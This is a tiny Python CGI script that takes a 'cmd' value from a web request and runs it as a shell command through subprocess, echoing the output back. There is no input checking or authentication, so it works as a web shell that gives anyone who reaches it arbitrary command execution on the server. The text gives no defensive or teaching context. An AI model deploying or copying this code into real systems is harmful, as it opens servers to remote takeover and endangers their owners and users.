//cgi- python script

#!/bin/python3

import cgi
import subprocess

print("content:text/html")
print()

data = cgi.FieldStorage()

command=data.getvalue("cmd")
print(command)

output=subprocess.getstatusoutput("{}".format(command))
print(output[1])
